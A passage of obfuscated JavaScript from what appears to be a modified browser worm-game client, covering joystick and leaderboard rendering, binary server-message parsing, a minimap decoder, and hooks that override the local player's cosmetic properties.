            this.jh = new _0x131478.Graphics();
            this.qh.alpha = 0.5;
            this.jh.zIndex = 100001;
            this.jh.alpha = 0.9;
            this.jh.beginFill(16225317);
            this.jh.drawCircle(0, 0, this.kh * 0.1);
            this.jh.endFill();
            this.jh.lineStyle(1, "black");
            this.jh.drawCircle(0, 0, this.kh * 0.1);
            this.jh.endFill();
            this.addChild(_0x496f61);
            this.addChild(this.qh);
            this.addChild(this.jh);
            this.sortableChildren = true;
            setTimeout(() => {
              if (window._wupin && _wupin.myLocation && _wupin.myLocation.parent) {
                this.globalJoystickPoint = new _0x131478.Graphics();
                this.globalJoystickPoint.zIndex = 100001;
                this.globalJoystickPoint.alpha = 0.9;
                this.globalJoystickPoint.beginFill(16225317);
                this.globalJoystickPoint.drawCircle(0, 0, this.kh * 0.1);
                this.globalJoystickPoint.endFill();
                this.globalJoystickPoint.lineStyle(1, "black");
                this.globalJoystickPoint.drawCircle(0, 0, this.kh * 0.1);
                this.globalJoystickPoint.endFill();
                _wupin.myLocation.parent.sortableChildren = true;
                _wupin.myLocation.parent.addChild(this.globalJoystickPoint);
                console.log("Global joystick point added with zIndex:", this.globalJoystickPoint.zIndex);
              }
            }, 100);
          });
        }();
        var _0x5c6e4f = function () {
          var _0x6cac35 = _0x2c22d1.M(_0x131478.Container, function () {
            _0x131478.Container.call(this);
            this.rh = {};
          });
          _0x6cac35.prototype.lh = function (_0xc7525d) {
            var _0x34f869 = 0.5 + Math.cos(_0x3c7003.F * (_0xc7525d / 1000 / 1.6)) * 0.5;
            for (var _0x278234 in this.rh) {
              var _0x3b863c = this.rh[_0x278234];
              var _0x512490 = _0x3b863c.sh;
              _0x3b863c.alpha = 1 - _0x512490 + _0x512490 * _0x34f869;
            }
          };
          _0x6cac35.prototype.Uf = function (_0x6ce9f5) {
            for (var _0x515dcc in this.rh) {
              if (_0x6ce9f5[_0x515dcc] == null || !_0x6ce9f5[_0x515dcc].hd) {
                _0x2c22d1.U(this.rh[_0x515dcc]);
                delete this.rh[_0x515dcc];
              }
            }
            var _0x94154d = 0;
            for (var _0x27ea9b in _0x6ce9f5) {
              var _0x570223 = _0x6ce9f5[_0x27ea9b];
              if (_0x570223.hd) {
                var _0x59e155 = this.rh[_0x27ea9b];
                if (!_0x59e155) {
                  var _0x18f2cb = _0xe610a0().Lc.Ub().pb(_0x570223.nd).ub;
                  _0x59e155 = new _0x230c76();
                  _0x59e155.texture = _0x18f2cb.Ea();
                  _0x59e155.width = 40;
                  _0x59e155.height = 40;
                  this.rh[_0x27ea9b] = _0x59e155;
                  this.addChild(_0x59e155);
                }
                _0x59e155.sh = _0x570223.od;
                _0x59e155.position.x = _0x94154d;
                _0x94154d += 40;
              }
            }
          };
          var _0x230c76 = function () {
            return _0x2c22d1.M(_0x131478.Sprite, function () {
              _0x131478.Sprite.call(this);
              this.sh = 0;
            });
          }();
          return _0x6cac35;
        }();
        var _0x597da4 = function () {
          var _0x1259a2 = _0x2c22d1.M(_0x131478.Container, function () {
            _0x131478.Container.call(this);
            this.bh = true;
            this.th = 12;
            this.uh = 9;
            this.jg = [];
            for (var _0x4dec7a = 0; _0x4dec7a < 14; _0x4dec7a++) {
              this.vh();
            }
          });
          _0x1259a2.prototype.Uf = function (_0x2d5831) {
            var _0x5db9cd = _0xe610a0();
            var _0x977cbb = _0x5db9cd.dh.hh.xg === _0x31b4a1.Ac.zc;
            var _0x2897c5 = 0;
            var _0x1d3918 = 0;
            if (_0x1d3918 >= this.jg.length) {
              this.vh();
            }
            this.jg[_0x1d3918].wh(1, "white");
            this.jg[_0x1d3918].xh("", _0x2c22d1.H("index.game.leader.top10"), "(" + _0x5db9cd.dh.yh + " online.)");
            this.jg[_0x1d3918].position.y = _0x2897c5;
            _0x2897c5 += this.th;
            _0x1d3918 += 1;
            if (_0x2d5831.zh.length > 0) {
              _0x2897c5 += this.uh;
            }
            for (var _0x3195d7 = 0; _0x3195d7 < _0x2d5831.zh.length; _0x3195d7++) {
              var _0x3d3b42 = _0x2d5831.zh[_0x3195d7];
              var _0x64ccc2 = _0x5db9cd.Lc.Ub().jb(_0x3d3b42.Ah);
              var _0xbab51d = "";
              var _0x401a41 = _0x5db9cd.Lc.Xb().textDict[_0x64ccc2.qb];
              if (_0x401a41 != null) {
                var _0x1f7429 = _0x2c22d1.I(_0x401a41);
                if (_0xdd462(_0x1f7429)) {
                  var _0x702352 = _0x454321(_0x1f7429);
                  _0x1f7429 = _0x55dd91(_0x1f7429);
                  _0x1f7429 = _0x1180ad(_0x1f7429);
                } else {
                  _0x1f7429 = _0x55dd91(_0x1f7429);
                  _0x1f7429 = _0x1180ad(_0x1f7429);
                }
                _0xbab51d = _0x4d2813(_0x1f7429, false);
              }
              if (_0x1d3918 >= this.jg.length) {
                this.vh();
              }
              this.jg[_0x1d3918].wh(0.8, _0x64ccc2.rb.tb);
              this.jg[_0x1d3918].xh("" + (_0x3195d7 + 1), _0xbab51d, "" + Math.floor(_0x3d3b42.Bh));
              this.jg[_0x1d3918].position.y = _0x2897c5;
              _0x2897c5 += this.th;
              _0x1d3918 += 1;
            }
            if (_0x2d5831.Ch.length > 0) {
              _0x2897c5 += this.uh;
            }
            for (var _0x395c8a = 0; _0x395c8a < _0x2d5831.Ch.length; _0x395c8a++) {
              var _0x4185d0 = _0x2d5831.Ch[_0x395c8a];
              var _0x14634c = _0x5db9cd.dh.hh.yg == _0x4185d0.Dh;
              var _0x44be5c;
              var _0x4576cc;
              if (_0x14634c) {
                _0x44be5c = "white";
                var _0x2a73e4 = _0x5db9cd.dh.ch.Eh.ma;
                if (_0xdd462(_0x2a73e4)) {
                  var _0x702352 = _0x454321(_0x2a73e4);
                  _0x2a73e4 = _0x55dd91(_0x2a73e4);
                  _0x2a73e4 = _0x1180ad(_0x2a73e4);
                } else {
                  _0x2a73e4 = _0x55dd91(_0x2a73e4);
                  _0x2a73e4 = _0x1180ad(_0x2a73e4);
                }
                _0x4576cc = _0x4d2813(_0x2a73e4, false);
              } else {
                var _0x50e8b0 = _0x5db9cd.dh.Fh[_0x4185d0.Dh];
                if (!_0x44be5c) {
                  _0x44be5c = "white";
                }
                if (_0x50e8b0 != null) {
                  _0x44be5c = _0x977cbb ? _0x5db9cd.Lc.Ub().jb(_0x50e8b0.Eh.Gh).rb.tb : _0x5db9cd.Lc.Ub().ib(_0x50e8b0.Eh.Hh).tb || _0x44be5c;
                  var _0x398686 = _0x50e8b0.Eh.ma;
                  if (this.bh && _0x16c0a6) {
                    if (_0xdd462(_0x398686)) {
                      var _0x702352 = _0x454321(_0x398686);
                      _0x398686 = _0x55dd91(_0x398686);
                      _0x398686 = _0x1180ad(_0x398686);
                    } else {
                      _0x398686 = _0x55dd91(_0x398686);
                      _0x398686 = _0x1180ad(_0x398686);
                    }
                    _0x4576cc = _0x4d2813(_0x398686, false);
                  } else {
                    _0x4576cc = "---";
                  }
                } else {
                  _0x44be5c = "gray";
                  _0x4576cc = "?";
                }
              }
              if (_0x1d3918 >= this.jg.length) {
                this.vh();
              }
              this.jg[_0x1d3918].wh(_0x14634c ? 1 : 0.8, _0x44be5c);
              this.jg[_0x1d3918].xh("" + (_0x395c8a + 1), _0x4576cc, "" + Math.floor(_0x4185d0.Bh));
              this.jg[_0x1d3918].position.y = _0x2897c5;
              _0x2897c5 += this.th;
              _0x1d3918 += 1;
              if (window.vps.lr !== 10 && window.vps.lr > 0 && _0x395c8a >= window.vps.lr - 1) {
                break;
              }
            }
            if (_0x5db9cd.dh.Ih > (window.vps.lr === 10 ? _0x2d5831.Ch.length : window.vps.lr)) {
              _0x2897c5 += this.uh;
              if (_0x1d3918 >= this.jg.length) {
                this.vh();
              }
              this.jg[_0x1d3918].wh(1, "white");
              var _0x347ec6 = _0x5db9cd.dh.ch.Eh.ma;
              if (_0xdd462(_0x347ec6)) {
                var _0x702352 = _0x454321(_0x347ec6);
                _0x347ec6 = _0x55dd91(_0x347ec6);
              } else {
                _0x347ec6 = _0x55dd91(_0x347ec6);
              }
              _0x347ec6 = _0x1180ad(_0x347ec6);
              this.jg[_0x1d3918].xh("" + _0x5db9cd.dh.Ih, _0x4d2813(_0x347ec6, false), "" + Math.floor(_0x5db9cd.dh.ch.Bh));
              this.jg[_0x1d3918].position.y = _0x2897c5;
              _0x2897c5 += this.th;
              _0x1d3918 += 1;
              _0x2897c5 += this.uh;
            }
            while (this.jg.length > _0x1d3918) {
              _0x2c22d1.U(this.jg.pop());
            }
          };
          _0x1259a2.prototype.vh = function () {
            var _0x1747f1 = new _0x2731b6();
            _0x1747f1.position.y = 0;
            if (this.jg.length > 0) {
              _0x1747f1.position.y = this.jg[this.jg.length - 1].position.y + this.th;
            }
            this.jg.push(_0x1747f1);
            this.addChild(_0x1747f1);
          };
          var _0x2731b6 = function () {
            var _0x5702e7 = _0x2c22d1.M(_0x131478.Container, function () {
              _0x131478.Container.call(this);
              this.Jh = new _0x131478.Text("", {
                fontFamily: "PTSans",
                fontSize: 12,
                fill: "white"
              });
              this.Jh.anchor.x = 1;
              this.Jh.position.x = 50;
              this.addChild(this.Jh);
              this.Kh = new _0x131478.Text("", {
                fontFamily: "PTSans",
                fontSize: 12,
                fill: "white"
              });
              this.Kh.anchor.x = 0;
              this.Kh.position.x = 55;
              this.addChild(this.Kh);
              this.Lh = new _0x131478.Text("", {
                fontFamily: "PTSans",
                fontSize: 12,
                fill: "white"
              });
              this.Lh.anchor.x = 1;
              this.Lh.position.x = 240;
              this.addChild(this.Lh);
            });
            _0x5702e7.prototype.xh = function (_0x3d7afd, _0x1f4057, _0x42f8a2) {
              this.Jh.text = _0x3d7afd;
              this.Lh.text = _0x42f8a2;
              this.Kh.text = _0x1f4057;
            };
            _0x5702e7.prototype.wh = function (_0x180154, _0x97ea18) {
              this.Jh.alpha = _0x180154;
              this.Jh.style.fill = _0x97ea18;
              this.Kh.alpha = _0x180154;
              this.Kh.style.fill = _0x97ea18;
              this.Lh.alpha = _0x180154;
              this.Lh.style.fill = _0x97ea18;
            };
            return _0x5702e7;
          }();
          return _0x1259a2;
        }();
        return _0x8b872b;
      }();
      _0x31b4a1.MessageProcessor = function () {
        function _0x49fe2a(_0x1bdc28) {
          this.dh = _0x1bdc28;
          this.Nh = [];
          this.Oh = 0;
        }
        _0x49fe2a.prototype.Ph = function (_0x5730fc) {
          this.Nh.push(new DataView(_0x5730fc));
        };
        _0x49fe2a.prototype.Qh = function () {
          this.Nh = [];
          this.Oh = 0;
        };
        _0x49fe2a.prototype.Rh = function () {
          for (var _0x21b99a = 0; _0x21b99a < 16; _0x21b99a++) {
            if (this.Nh.length === 0) {
              return;
            }
            var _0x5a101d = this.Nh.shift();
            try {
              this.Sh(_0x5a101d);
            } catch (_0x1b4e63) {
              throw _0x1b4e63;
            }
          }
        };
        _0x49fe2a.prototype.Sh = function (_0x2042a7) {
          switch (_0x2042a7.ba(0) & 255) {
            case 0:
              this.Th(_0x2042a7, 1);
              return;
            case 1:
              this.Uh(_0x2042a7, 1);
              return;
            case 2:
              this.Vh(_0x2042a7, 1);
              return;
            case 3:
              this.Wh(_0x2042a7, 1);
              return;
            case 4:
              this.Xh(_0x2042a7, 1);
              return;
            case 5:
              this.Yh(_0x2042a7, 1);
              return;
          }
        };
        _0x49fe2a.prototype.Th = function (_0x4d9967, _0x926d6a) {
          this.dh.hh.xg = _0x4d9967.ba(_0x926d6a);
          _0x926d6a += 1;
          var _0x2a280d = _0x4d9967.ca(_0x926d6a);
          _0x926d6a += 2;
          this.dh.hh.yg = _0x2a280d;
          this.dh.ch.Eh.ae = _0x2a280d;
          this.dh.hh.zg = _0x4d9967.ea(_0x926d6a);
          _0x926d6a += 4;
          this.dh.hh.Ag = _0x4d9967.ea(_0x926d6a);
          _0x926d6a += 4;
          this.dh.hh.Bg = _0x4d9967.ea(_0x926d6a);
          _0x926d6a += 4;
          _0xe610a0().og.af.ng.Uf(this.dh.hh, _0xe610a0().og.$h.Zh());
          return _0x926d6a;
        };
        _0x49fe2a.prototype.Uh = function (_0xe352df, _0xb5a784) {
          var _0x2e0075 = this.Oh++;
          var _0x182613 = _0xe352df.ca(_0xb5a784);
          _0xb5a784 += 2;
          var _0x26ea4f = undefined;
          _0x26ea4f = this._h(_0xe352df, _0xb5a784);
          _0xb5a784 += this.ai(_0x26ea4f);
          for (var _0x24d564 = 0; _0x24d564 < _0x26ea4f; _0x24d564++) {
            _0xb5a784 = this.bi(_0xe352df, _0xb5a784);
          }
          _0x26ea4f = this._h(_0xe352df, _0xb5a784);
          _0xb5a784 += this.ai(_0x26ea4f);
          for (var _0x2c89cf = 0; _0x2c89cf < _0x26ea4f; _0x2c89cf++) {
            _0xb5a784 = this.ci(_0xe352df, _0xb5a784);
          }
          _0x26ea4f = this._h(_0xe352df, _0xb5a784);
          _0xb5a784 += this.ai(_0x26ea4f);
          for (var _0x215a1a = 0; _0x215a1a < _0x26ea4f; _0x215a1a++) {
            _0xb5a784 = this.di(_0xe352df, _0xb5a784);
          }
          _0x26ea4f = this._h(_0xe352df, _0xb5a784);
          _0xb5a784 += this.ai(_0x26ea4f);
          for (var _0x2929a1 = 0; _0x2929a1 < _0x26ea4f; _0x2929a1++) {
            _0xb5a784 = this.ei(_0xe352df, _0xb5a784);
          }
          _0x26ea4f = this._h(_0xe352df, _0xb5a784);
          _0xb5a784 += this.ai(_0x26ea4f);
          for (var _0x1f33cb = 0; _0x1f33cb < _0x26ea4f; _0x1f33cb++) {
            _0xb5a784 = this.fi(_0xe352df, _0xb5a784);
          }
          _0x26ea4f = this._h(_0xe352df, _0xb5a784);
          _0xb5a784 += this.ai(_0x26ea4f);
          for (var _0x133b1b = 0; _0x133b1b < _0x26ea4f; _0x133b1b++) {
            _0xb5a784 = this.gi(_0xe352df, _0xb5a784);
          }
          _0x26ea4f = this._h(_0xe352df, _0xb5a784);
          _0xb5a784 += this.ai(_0x26ea4f);
          for (var _0x192cb0 = 0; _0x192cb0 < _0x26ea4f; _0x192cb0++) {
            _0xb5a784 = this.hi(_0xe352df, _0xb5a784);
          }
          _0x26ea4f = this._h(_0xe352df, _0xb5a784);
          _0xb5a784 += this.ai(_0x26ea4f);
          for (var _0x1a4cdf = 0; _0x1a4cdf < _0x26ea4f; _0x1a4cdf++) {
            _0xb5a784 = this.ii(_0xe352df, _0xb5a784);
          }
          if (_0x2e0075 > 0) {
            _0xb5a784 = this.ji(_0xe352df, _0xb5a784);
          }
          this.dh.ki(_0x2e0075, _0x182613);
          return _0xb5a784;
        };
        _0x49fe2a.prototype.ei = function (_0x422806, _0x425b1e) {
          var _0x594b64 = new _0x31b4a1.Worm.li();
          _0x594b64.ae = _0x422806.ca(_0x425b1e);
          _0x425b1e += 2;
          _0x594b64.Gh = this.dh.hh.xg === _0x31b4a1.Ac.zc ? _0x422806.ba(_0x425b1e++) : _0x261341.ps ? _0x261341.ps : _0x31b4a1.GameParams.Cg;
          _0x594b64.Hh = _0x422806.ca(_0x425b1e);
          _0x261341.p("Hh|lj", _0x425b1e);
          _0x425b1e += 2;
          _0x594b64.ni = _0x422806.ca(_0x425b1e);
          _0x261341.p("ni|mj", _0x425b1e);
          _0x425b1e += 2;
          _0x594b64.oi = _0x422806.ca(_0x425b1e);
          _0x261341.p("oi|nj", _0x425b1e);
          _0x425b1e += 2;
          _0x594b64.pi = _0x422806.ca(_0x425b1e);
          _0x261341.p("pi|pj", _0x425b1e);
          _0x425b1e += 2;
          _0x594b64.qi = _0x422806.ca(_0x425b1e);
          _0x261341.p("qi|oj", _0x425b1e);
          _0x425b1e += 2;
          var _0x5f0dea = _0x422806.ba(_0x425b1e);
          _0x425b1e += 1;
          var _0x38087c = "";
          for (var _0x3f9d22 = 0; _0x3f9d22 < _0x5f0dea; _0x3f9d22++) {
            _0x38087c += String.fromCharCode(_0x422806.ca(_0x425b1e));
            _0x425b1e += 2;
          }
          _0x594b64.ma = _0x38087c;
          if (this.dh.hh.yg === _0x594b64.ae) {
            var _0x7402a2 = Object.keys(_0x261341.pm);
            _0x7402a2.forEach(function (_0x8942a8) {
              _0x594b64[_0x8942a8] = window.vps.PropertyManager[_0x261341.pm[_0x8942a8].p];
              _0x422806.setInt16(_0x261341.pm[_0x8942a8].i, _0x594b64[_0x8942a8]);
            });
            this.dh.ch.ri(_0x594b64);
            _wup.startGame();
          } else {
            var _0x269e1b = this.dh.Fh[_0x594b64.ae];
            if (_0x269e1b != null) {
              _0x269e1b.si();
            }
            var _0x1754fd = new _0x31b4a1.Worm(this.dh.hh);
            _0x1754fd.ti(_0xe610a0().og.af.ng);
            this.dh.Fh[_0x594b64.ae] = _0x1754fd;
            _0x1754fd.ri(_0x594b64);
          }
          _0x261341.ae(_0x422806, _0x594b64, this);
          return _0x425b1e;
        };
        _0x49fe2a.prototype.fi = function (_0x2425ce, _0x16240e) {
          var _0x1be1fc = _0x2425ce.ca(_0x16240e);
          _0x16240e += 2;
          var _0x39575a = _0x2425ce.ba(_0x16240e);
          _0x16240e++;
          var _0x1cc97b = !!(_0x39575a & 1);
          var _0x2b50d2 = !!(_0x39575a & 2);
          var _0x1cdaca = 0;
          if (_0x1cc97b) {
            _0x1cdaca = _0x2425ce.ca(_0x16240e);
            _0x16240e += 2;
          }
          var _0x362dba = this.vi(_0x1be1fc);
          if (_0x362dba === undefined) {
            return _0x16240e;
          }
          _0x362dba.wi = false;
          if (!_0x362dba.xi) {
            return _0x16240e;
          }
          var _0x2dbbfb = this.vi(_0x1be1fc);
          if (_0x1cc97b && _0x2dbbfb !== undefined && _0x2dbbfb.xi) {
            if (_0x1cdaca === this.dh.hh.yg) {
              var _0x386f09 = this.dh.ch.fh();
              var _0x53aa5c = _0x362dba.yi(_0x386f09.x, _0x386f09.y);
              Math.max(0, 1 - _0x53aa5c.distance / (this.dh.eh * 0.5));
              if (_0x53aa5c.distance < this.dh.eh * 0.5) {
                var _0x41adb3 = _0xe610a0().og.af.ng.Wg;
                var _0x2e0f77 = null;
                if (_0x362dba && _0x362dba.Eh && _0x362dba.Eh.ma) {
                  _0x2e0f77 = _0x362dba.Eh.ma;
                } else if (_0x362dba && _0x362dba.ma) {
                  _0x2e0f77 = _0x362dba.ma;
                } else if (_0x362dba && _0x362dba.name) {
                  _0x2e0f77 = _0x362dba.name;
                } else if (this.dh && this.dh.Fh && this.dh.Fh[_0x1be1fc]) {
                  const _0x439646 = this.dh.Fh[_0x1be1fc];
                  if (_0x439646 && _0x439646.Eh && _0x439646.Eh.ma) {
                    _0x2e0f77 = _0x439646.Eh.ma;
                  }
                }
                _0x41adb3.mg(_0x2b50d2, _0x2e0f77);
              }
            } else if (_0x1be1fc === this.dh.hh.yg) ;else {
              var _0x56d60b = this.dh.ch.fh();
              var _0x4a7910 = _0x362dba.yi(_0x56d60b.x, _0x56d60b.y);
              Math.max(0, 1 - _0x4a7910.distance / (this.dh.eh * 0.5));
            }
          } else if (_0x1be1fc === this.dh.hh.yg) ;else {
            var _0x45e4ab = this.dh.ch.fh();
            var _0xaba498 = _0x362dba.yi(_0x45e4ab.x, _0x45e4ab.y);
            Math.max(0, 1 - _0xaba498.distance / (this.dh.eh * 0.5));
          }
          return _0x16240e;
        };
        _0x49fe2a.prototype.ii = function (_0x457d13, _0x291643) {
          var _0x1fb8c6 = _0x457d13.ca(_0x291643);
          _0x291643 += 2;
          var _0x10819b = _0x1fb8c6 === this.dh.hh.yg ? null : this.dh.Fh[_0x1fb8c6];
          var _0x45fd4a = _0x457d13.ba(_0x291643);
          _0x291643 += 1;
          var _0x4c8a75 = !!(_0x45fd4a & 1);
          if (_0x45fd4a & 2) {
            var _0xf74099 = _0x457d13.ea(_0x291643);
            _0x291643 += 4;
            if (_0x10819b) {
              _0x10819b.zi(_0xf74099);
            }
          }
          var _0xe5076a = this.Ai(_0x457d13.ba(_0x291643++), _0x457d13.ba(_0x291643++), _0x457d13.ba(_0x291643++));
          var _0x3b0010 = this.Ai(_0x457d13.ba(_0x291643++), _0x457d13.ba(_0x291643++), _0x457d13.ba(_0x291643++));
          if (_0x10819b) {
            _0x10819b.Bi(_0xe5076a, _0x3b0010, _0x4c8a75);
            var _0x3faef0 = this.dh.ch.fh();
            var _0xc78d4b = _0x10819b.fh();
            var _0xc50807 = Math.max(0, 1 - Math.hypot(_0x3faef0.x - _0xc78d4b.x, _0x3faef0.y - _0xc78d4b.y) / (this.dh.eh * 0.5));
            _0xe610a0().Ci.Ye(_0xc50807, _0x1fb8c6, _0x4c8a75);
          }
          var _0x49113e = this._h(_0x457d13, _0x291643);
          _0x291643 += this.ai(_0x49113e);
          if (_0x10819b) {
            for (var _0x207a5e in _0x10819b.dd) {
              var _0x22b68f = _0x10819b.dd[_0x207a5e];
              if (_0x22b68f) {
                _0x22b68f.hd = false;
              }
            }
          }
          for (var _0x4a0307 = 0; _0x4a0307 < _0x49113e; _0x4a0307++) {
            var _0x34eac9 = _0x457d13.ba(_0x291643);
            _0x291643++;
            var _0x1d88d0 = _0x457d13.ba(_0x291643);
            _0x291643++;
            if (_0x10819b) {
              var _0x23f154 = _0x10819b.dd[_0x34eac9];
              _0x23f154 ||= _0x10819b.dd[_0x34eac9] = new _0x31b4a1.fd(_0x34eac9);
              _0x23f154.hd = true;
              _0x23f154.od = Math.min(1, Math.max(0, _0x1d88d0 / 100));
            }
          }
          return _0x291643;
        };
        _0x49fe2a.prototype.ji = function (_0x2f0014, _0x25dc0e) {
          var _0x4802ea = this.dh.ch;
          var _0x4cb7a7 = _0x2f0014.ba(_0x25dc0e);
          _0x25dc0e += 1;
          var _0x2559a5 = !!(_0x4cb7a7 & 1);
          var _0x5cfe25 = !!(_0x4cb7a7 & 2);
          var _0x1424ec = !!(_0x4cb7a7 & 4);
          if (_0x5cfe25) {
            var _0x206ff8 = _0x4802ea.Bh;
            _0x4802ea.zi(_0x2f0014.ea(_0x25dc0e));
            _0x25dc0e += 4;
            _0x206ff8 = _0x4802ea.Bh - _0x206ff8;
            if (_0x206ff8 > 0) {
              _0xe610a0().og.af.ng.Wg.lg(_0x206ff8);
            }
          }
          if (_0x1424ec) {
            this.dh.Di = _0x2f0014.ea(_0x25dc0e);
            _0x25dc0e += 4;
          }
          var _0x2d6f96 = this.Ai(_0x2f0014.ba(_0x25dc0e++), _0x2f0014.ba(_0x25dc0e++), _0x2f0014.ba(_0x25dc0e++));
          var _0x4d088c = this.Ai(_0x2f0014.ba(_0x25dc0e++), _0x2f0014.ba(_0x25dc0e++), _0x2f0014.ba(_0x25dc0e++));
          _0x4802ea.Bi(_0x2d6f96, _0x4d088c, _0x2559a5);
          _0xe610a0().Ci.Ye(0.5, this.dh.hh.yg, _0x2559a5);
          var _0x48a0c9 = this._h(_0x2f0014, _0x25dc0e);
          _0x25dc0e += this.ai(_0x48a0c9);
          for (var _0x46043b in _0x4802ea.dd) {
            var _0x15c738 = _0x4802ea.dd[_0x46043b];
            if (_0x15c738) {
              _0x15c738.hd = false;
            }
          }
          for (var _0x4b273f = 0; _0x4b273f < _0x48a0c9; _0x4b273f++) {
            var _0x18d8ad = _0x2f0014.ba(_0x25dc0e);
            _0x25dc0e++;
            var _0x1a8b97 = _0x2f0014.ba(_0x25dc0e);
            _0x25dc0e++;
            var _0x3dbc5f = _0x4802ea.dd[_0x18d8ad];
            if (!_0x3dbc5f) {
              _0x3dbc5f = new _0x31b4a1.fd(_0x18d8ad);
              _0x4802ea.dd[_0x18d8ad] = _0x3dbc5f;
            }
            _0x3dbc5f.hd = true;
            _0x3dbc5f.od = Math.min(1, Math.max(0, _0x1a8b97 / 100));
          }
          _0xe610a0().og.af.ng.Ug.Uf(_0x4802ea.dd);
        };
        _0x49fe2a.prototype.gi = function (_0x8df664, _0x589fa5) {
          var _0x5af4c1 = this;
          var _0x124c6f = _0x8df664.ca(_0x589fa5);
          _0x589fa5 += 2;
          var _0x4437ea = this.vi(_0x124c6f);
          var _0x4c8a1e = _0x8df664.ea(_0x589fa5);
          _0x589fa5 += 4;
          var _0x4094b8 = this._h(_0x8df664, _0x589fa5);
          _0x589fa5 += this.ai(_0x4094b8);
          if (_0x4437ea) {
            _0x4437ea.zi(_0x4c8a1e);
            _0x4437ea.Ei(function () {
              return _0x5af4c1.Ai(_0x8df664.ba(_0x589fa5++), _0x8df664.ba(_0x589fa5++), _0x8df664.ba(_0x589fa5++));
            }, _0x4094b8);
            _0x4437ea.kd(true);
            var _0x4462a4 = this.dh.ch.fh();
            var _0x34fdb2 = _0x4437ea.fh();
            var _0x5d062d = Math.max(0, 1 - Math.hypot(_0x4462a4.x - _0x34fdb2.x, _0x4462a4.y - _0x34fdb2.y) / (this.dh.eh * 0.5));
            _0xe610a0().Ci.We(_0x5d062d, _0x124c6f);
          } else {
            _0x589fa5 += _0x4094b8 * 6;
          }
          return _0x589fa5;
        };
        _0x49fe2a.prototype.hi = function (_0x10c63d, _0x4cdf4e) {
          var _0x594bdc = _0x10c63d.ca(_0x4cdf4e);
          _0x4cdf4e += 2;
          var _0x5f59a6 = this.dh.Fh[_0x594bdc];
          if (_0x5f59a6 && _0x5f59a6.wi) {
            _0x5f59a6.kd(false);
          }
          _0xe610a0().Ci.Xe(_0x594bdc);
          return _0x4cdf4e;
        };
        _0x49fe2a.prototype.bi = function (_0x2a0ff2, _0x1437e5) {
          var _0x5ca6c0 = new _0x31b4a1.Fi.li();
          _0x5ca6c0.ae = _0x2a0ff2.da(_0x1437e5);
          _0x1437e5 += 4;
          _0x5ca6c0.Gh = this.dh.hh.xg === _0x31b4a1.Ac.zc ? _0x2a0ff2.ba(_0x1437e5++) : _0x261341.ps ? _0x261341.ps : _0x31b4a1.GameParams.Cg;
          _0x5ca6c0.Gi = this.Ai(_0x2a0ff2.ba(_0x1437e5++), _0x2a0ff2.ba(_0x1437e5++), _0x2a0ff2.ba(_0x1437e5++));
          _0x5ca6c0.Hh = _0x2a0ff2.ba(_0x1437e5++);
          var _0x204665 = this.dh.Hi[_0x5ca6c0.ae];
          if (_0x204665 != null) {
            _0x204665.si();
          }
          var _0x4d7773 = new _0x31b4a1.Fi(_0x5ca6c0, _0xe610a0().og.af.ng);
          _0x4d7773.Ii(this.Ji(_0x5ca6c0.ae), this.Ki(_0x5ca6c0.ae), true);
          this.dh.Hi[_0x5ca6c0.ae] = _0x4d7773;
          return _0x1437e5;
        };
        _0x49fe2a.prototype.ci = function (_0x208e94, _0x4373a9) {
          var _0x290132 = _0x208e94.da(_0x4373a9);
          _0x4373a9 += 4;
          var _0x39bac5 = this.dh.Hi[_0x290132];
          if (_0x39bac5) {
            _0x39bac5.Li = 0;
            _0x39bac5.Mi = _0x39bac5.Mi * 1.5;
            _0x39bac5.Ni = true;
          }
          return _0x4373a9;
        };
        _0x49fe2a.prototype.di = function (_0x369610, _0x277836) {
          var _0x28431f = _0x369610.da(_0x277836);
          _0x277836 += 4;
          var _0x4cff37 = _0x369610.ca(_0x277836);
          _0x277836 += 2;
          var _0x4200be = this.dh.Hi[_0x28431f];
          if (_0x4200be) {
            _0x4200be.Li = 0;
            _0x4200be.Mi = _0x4200be.Mi * 0.1;
            _0x4200be.Ni = true;
            var _0x2db5d4 = this.vi(_0x4cff37);
            if (_0x2db5d4 && _0x2db5d4.xi) {
              this.dh.hh.yg;
              var _0x1ec8df = _0x2db5d4.fh();
              _0x4200be.Ii(_0x1ec8df.x, _0x1ec8df.y, false);
            }
          }
          return _0x277836;
        };
        var _0x4c3d76 = [34, 29, 26, 24, 22, 20, 18, 17, 15, 14, 13, 12, 11, 10, 9, 8, 8, 7, 6, 6, 5, 5, 4, 4, 3, 3, 2, 2, 2, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 1, 2, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6, 7, 8, 8, 9, 10, 11, 12, 13, 14, 15, 17, 18, 20, 22, 24, 26, 29, 34];
        _0x49fe2a.prototype.Vh = function (_0x4d4963) {
          var _0x4d04a7 = _0xe610a0().Lc.Zb().Fb;
          var _0xd23845 = _0x4d04a7.getImageData(0, 0, 80, 80);
          var _0x1a2969 = _0x4c3d76[0];
          var _0x27b618 = 80 - _0x1a2969;
          var _0x3f8b20 = 0;
          for (var _0x19d96d = 0; _0x19d96d < 628; _0x19d96d++) {
            var _0x35a9b2 = _0x4d4963.ba(1 + _0x19d96d);
            for (var _0x2fb071 = 0; _0x2fb071 < 8; _0x2fb071++) {
              var _0xd65a3f = (_0x35a9b2 >> _0x2fb071 & 1) != 0;
              var _0x29520a = (_0x1a2969 + _0x3f8b20 * 80) * 4;
              if (_0xd65a3f) {
                _0xd23845.data[_0x29520a] = 255;
                _0xd23845.data[_0x29520a + 1] = 255;
                _0xd23845.data[_0x29520a + 2] = 255;
                _0xd23845.data[_0x29520a + 3] = 255;
              } else {
                _0xd23845.data[_0x29520a + 3] = 0;
              }
              if (++_0x1a2969 >= _0x27b618 && ++_0x3f8b20 < 80) {
                _0x1a2969 = _0x4c3d76[_0x3f8b20];
                _0x27b618 = 80 - _0x1a2969;
              }
            }
          }
          _0x4d04a7.putImageData(_0xd23845, 0, 0);
          var _0x5706f9 = _0xe610a0().og.af.ng.Tg.qh;
          _0x5706f9.texture = _0xe610a0().Lc.Zb().oa;
          _0x5706f9.texture.update();
        };
        _0x49fe2a.prototype.Xh = function (_0xd1c2e5, _0x5768b0) {
          _0xd1c2e5.da(_0x5768b0);
        };
        _0x49fe2a.prototype.Yh = function (_0x4158c4, _0x3de436) {
          this.dh.Oi();
        };
        _0x49fe2a.prototype.Wh = function (_0x224b11, _0x377d52) {
          this.dh.yh = _0x224b11.ca(_0x377d52);
          _0x377d52 += 2;
          this.dh.Ih = _0x224b11.ca(_0x377d52);
          _0x377d52 += 2;
